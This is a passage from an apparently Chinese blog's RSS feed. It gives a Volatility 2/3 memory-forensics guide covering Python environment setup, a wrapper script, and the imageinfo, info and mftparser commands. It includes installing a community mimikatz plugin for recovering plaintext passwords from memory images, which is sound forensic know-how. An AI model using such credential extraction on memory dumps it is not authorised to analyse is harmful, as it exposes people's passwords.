&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://localhost:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250722140517678.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250722140517678&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>volatility使用说明</title>
        <link>https://blog.928330.xyz/p/volatility%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</link>
        <pubDate>Mon, 21 Jul 2025 12:51:01 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/volatility%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</guid>
        <description>&lt;h1 id=&#34;前置步骤问题解决&#34;&gt;前置步骤/问题解决
&lt;/h1&gt;&lt;h2 id=&#34;下载&#34;&gt;下载
&lt;/h2&gt;&lt;p&gt;Volatility2：https://github.com/volatilityfoundation/volatility&lt;/p&gt;
&lt;p&gt;Volatility3：https://github.com/volatilityfoundation/volatility3&lt;/p&gt;
&lt;h2 id=&#34;python版本&#34;&gt;python版本
&lt;/h2&gt;&lt;p&gt;update-alternatives是Debian/Ubuntu系统提供的管理系统级默认命令的工具，通过维护符号链接工作&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置优先级，一般使用整数：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;update-alternatives --install /usr/bin/python python /usr/bin/python2 &lt;span style=&#34;color:#d19a66&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;update-alternatives --install /usr/bin/python python /usr/bin/python3 &lt;span style=&#34;color:#d19a66&#34;&gt;150&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;查看当前可识别的版本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; update-alternatives --list python
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/python2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/python3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/python3.11
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;切换版本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;update-alternatives --config python
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;有 &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt; 个候选项可用于替换 python &lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;提供 /usr/bin/python&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  选择       路径               优先级  状态
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;------------------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;            /usr/bin/python3      &lt;span style=&#34;color:#d19a66&#34;&gt;150&lt;/span&gt;       自动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;            /usr/bin/python2      &lt;span style=&#34;color:#d19a66&#34;&gt;100&lt;/span&gt;       手动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;            /usr/bin/python3      &lt;span style=&#34;color:#d19a66&#34;&gt;150&lt;/span&gt;       手动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;            /usr/bin/python3.11   &lt;span style=&#34;color:#d19a66&#34;&gt;125&lt;/span&gt;       手动模式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;要维持当前值&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;请按&amp;lt;回车键&amp;gt;，或者键入选择的编号：
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;输入数字切换版本&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;虚拟环境&#34;&gt;虚拟环境
&lt;/h2&gt;&lt;h3 id=&#34;安装&#34;&gt;安装
&lt;/h3&gt;&lt;p&gt;volatility2是基于python2开发的，所以虚拟环境也要使用python2的virtualenv创建&lt;/p&gt;
&lt;p&gt;这里以我下载python2.7版本的虚拟环境步骤为例，记录一些遇到的问题&lt;/p&gt;
&lt;p&gt;首先下载pip2，需要切换到python2的环境，并且由于linux系统大多放弃了apt对python2的支持，所以无法使用apt install下载，需要手动安装&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.下载脚本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;2.运行脚本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python2 get-pip.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;3.检查是否安装成功：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 -V
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功显示出pip的版本号，以及它关联的是Python 2.7，就说明已经成功为安装好了pip2&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.安装virtualenv：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装的版本必须是兼容python2的，直接安装可能会下载到python3的版本，所以要指定版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;virtualenv&amp;lt;20&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果是volatility3，也就是基于python3的版本，就可以使用apt直接下载对应的venv工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;先更新，后下载：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install python3-venv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样就完成了安装&lt;/p&gt;
&lt;h3 id=&#34;创建&#34;&gt;创建
&lt;/h3&gt;&lt;p&gt;python2：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python2 -m virtualenv 虚拟环境名
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;python3：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m venv 虚拟环境名
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;使用&#34;&gt;使用
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;source 虚拟环境名/bin/activate
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;提示符前面会多一个&lt;code&gt;(虚拟环境名)&lt;/code&gt;的标记，之后的所有python和pip命令都只作用在此环境下&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;分享依赖&#34;&gt;分享依赖
&lt;/h3&gt;&lt;p&gt;这条命令会将当前环境中所有已安装的库及其版本号写入到&lt;code&gt;requirements.txt&lt;/code&gt;中：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip freeze &amp;gt; requirements.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果别人需要用，只需创建一个新的虚拟环境，再运行：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通常我们也是使用这个命令来下载对应工具需要的依赖&lt;/p&gt;
&lt;h3 id=&#34;退出&#34;&gt;退出
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;deactivate
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;删除&#34;&gt;删除
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rm -rf 虚拟环境名
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;设置为系统级命令&#34;&gt;设置为系统级命令
&lt;/h2&gt;&lt;h3 id=&#34;编写启动脚本&#34;&gt;编写启动脚本
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim /usr/local/bin/vol
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;向里面写入下面内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python /home/kali/volatility2/vol.py &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$@&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;的意思是：如果前一个命令成功，则执行后一个命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;前者是启动虚拟环境，要写对应创建的虚拟环境路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后者是把所有参数传递给volatility脚本，要写对应的vol.py路径&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;给脚本添加启动权限&#34;&gt;给脚本添加启动权限
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo chmod +x /usr/local/bin/vol
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样就设置完成了，如果不行，就刷新一下命令缓存再运行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;hash&lt;/span&gt; -r
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;报错解决&#34;&gt;报错解决
&lt;/h2&gt;&lt;h3 id=&#34;缺少运行库&#34;&gt;缺少运行库
&lt;/h3&gt;&lt;p&gt;换了两个虚拟机，每次运行volatility2的时候都会遇到库pycryptodome和distorm3不存在的问题&lt;/p&gt;
&lt;p&gt;这种情况只要进入对应虚拟环境，然后安装缺少的库即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install pycryptodome
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install distorm3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deactivate
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;安装插件&#34;&gt;安装插件
&lt;/h2&gt;&lt;p&gt;volatility2历史悠久，社区也很强大，很多人开发了非常好用的插件，需要我们手动安装&lt;/p&gt;
&lt;p&gt;这里以mimikatz插件为例，具体的下载地址网上一搜就有&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;下载插件，这里使用wget，其他方式随意：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso/mimikatz.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;移动到存放插件的目录，一般是&lt;code&gt;volatility2/volatility/plugins/&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv mimikatz.py /home/kali/volatility2/volatility/plugins/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后就可以使用了，不过mimikatz使用还需要安装依赖，具体看&lt;a class=&#34;link&#34; href=&#34;#%e6%8f%90%e5%8f%96%e6%98%8e%e6%96%87%e5%af%86%e7%a0%81%ef%bc%88mimikatz%ef%bc%89&#34; &gt;mimikatz
    
&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;volatility常用命令&#34;&gt;Volatility常用命令
&lt;/h1&gt;&lt;h2 id=&#34;系统画像&#34;&gt;系统画像
&lt;/h2&gt;&lt;h3 id=&#34;查看系统信息imageinfoinfo&#34;&gt;查看系统信息（imageinfo/info）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;这是vol2进行任何分析前必须执行的第一步，用于确定操作系统的Profile，即版本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; imageinfo 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&amp;lt;内存镜像&amp;gt;的后缀名没有固定的，可能是raw，dump，img，vmem等等&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708193517165.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250708193517165&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Suggested Profile(s)：建议的配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在后续执行所有其他插件时，都需要通过 &lt;code&gt;--profile=&amp;lt;profile_name&amp;gt;&lt;/code&gt; 参数从这个列表中选择一个来使用&lt;/p&gt;
&lt;p&gt;通常，选择列表中的第一个（&lt;code&gt;Win7SP1x64&lt;/code&gt;）就是最合适的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;KDBG：内核调试块地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用于定位其他所有系统信息，如进程列表、驱动列表等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Image date and time：镜像日期和时间，世界标准时间零时区UTC＋0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里表明内存快照是在UTC时间2019年12月20日03:47:57被创建&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Image local date and time：原始机器当时的本地时间，包含时区信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;03:47:57&lt;/code&gt;加上&lt;code&gt;5小时30分钟&lt;/code&gt;，正好等于&lt;code&gt;09:17:57&lt;/code&gt;，这就是当地的时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Number of Processors：处理器数量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里显示该系统是单核处理器&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;V3会自动检测Profile，之后的命令无需手动输入，此命令用于显示详细的信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.info.Info
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712211412813.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250712211412813&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NTBuildLab&lt;/strong&gt;：&lt;strong&gt;Windows操作系统构建版本标签&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;7601.17514.amd64fre.win7sp1_rtm&lt;/code&gt;，代表一个经过后续更新（修订号17514）的、面向64位amd架构的、已正式发布的、基于Windows7SP1开发分支的操作系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;KeNumberProcessors：处理器个数&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SystemTime&lt;/strong&gt;：&lt;strong&gt;内存快照被制作的时间，世界标准时间零时区UTC＋0&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NtProductType： Windows操作系统的产品类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtProductWinNt&lt;/code&gt;：客户端版本&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtProductServer&lt;/code&gt;：服务器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NtProductLanManNt&lt;/code&gt;：域控制器，是特定类型的服务器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NtMajorVersion / NtMinorVersion&lt;/strong&gt;：&lt;strong&gt;Windows操作系统内核的主版本号和次版本号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;6.1在WindowsNT内核版本中，对应着Windows7或WindowsServer2008R2&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PE TimeDateStamp&lt;/strong&gt;：&lt;strong&gt;系统内核文件被编译的时间&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看文件信息mftparsermftscan&#34;&gt;查看文件信息（mftparser/mftscan）
&lt;/h3&gt;&lt;p&gt;除了Volatility，还可以使用其他工具导出mft记录：https://github.com/jschicht/Mft2Csv/releases&lt;/p&gt;
&lt;p&gt;下载打开软件，选择&lt;code&gt;$MFT&lt;/code&gt;文件，然后导出到&lt;code&gt;csv&lt;/code&gt;文件即可，导出的条目会以&lt;code&gt;csv&lt;/code&gt;文件的形式存放在软件目录下&lt;/p&gt;
&lt;h4 id=&#34;volatility2-1&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; mftparser
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716202015759.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250716202015759&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MFT entry found at offset &amp;hellip;&lt;/strong&gt;：该MFT记录在内存中的物理偏移地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Attribute:In Use &amp;amp; File&lt;/strong&gt;：表明这是一条活动的、描述文件的记录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Record Number&lt;/strong&gt;：该记录在MFT中的唯一编号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Link count&lt;/strong&gt;：指向这个文件实体的文件名数量（硬链接数）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;$STANDARD_INFORMATION&lt;/strong&gt;：主属性，只有当&lt;strong&gt;文件内容&lt;/strong&gt;被编辑时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间才会改变&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;$FILE_NAME&lt;/strong&gt;：文件名属性，文件&lt;strong&gt;内容被改动、重命名、移动&lt;/strong&gt;时，其&lt;code&gt;Modified&lt;/code&gt;和&lt;code&gt;Updated&lt;/code&gt;时间都会改变&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Creation&lt;/strong&gt;：创建时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Modified&lt;/strong&gt;：修改时间&lt;/p&gt;
